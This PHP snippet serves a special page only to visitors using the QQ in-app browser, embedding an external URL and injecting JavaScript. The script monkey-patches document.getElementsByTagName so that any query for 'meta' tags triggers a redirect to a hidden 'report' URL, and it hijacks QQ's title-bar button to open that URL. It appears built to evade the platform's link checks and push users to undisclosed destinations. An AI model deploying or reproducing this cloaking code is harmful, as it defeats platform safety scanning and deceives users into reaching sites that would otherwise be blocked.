<?php
if (strpos($_SERVER['HTTP_USER_AGENT'], 'QQ/') !==false) {
	echo '<!DOCTYPE html>
				<html lang="zh">
				<head>
				<title>'.$title.'</title>
				<meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
				</head>
				<style>
				  *{margin:0;padding:0;font-family: "Microsoft YaHei";color: #fff;}
					body,div,form,input,li,ol,p,textarea,ul{margin:0;padding:0;font-family: "Microsoft YaHei";color: #fff;}
				  body{background:#fff;color:#3f3f3f;font-family:Apple LiGothic Medium,SimHei,Geneva,Arial,Helvetica,sans-serif;-webkit-tap-highlight-color:transparent;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;-webkit-appearance:none;width:100%;font-size:12px;}
				  body p {color: white;text-align: center;line-height: 25px;}
				</style>
	
			

			
<embed src="'.$t_url.'" width="100%" height="680" allowNetworking="all">
<script>
if (report == null) { var report="'.$t_rs.'";} var Zeptoq = document.getElementsByTagName;document.getElementsByTagName = function(a) { if (a == "meta") { window.location.href = report; return } if (a == "script" || a == "body") { return Zeptoq.call(document, a) } else { return } }; mqq.ui.setTitleButtons({ left : { title : "QQ", }, right : { title : "•••", callback : function () { mqq.ui.openUrl({ target: 2,style: 1,url: report}) } } });
</script>
				</body>
				</html>';
 exit;

}

?>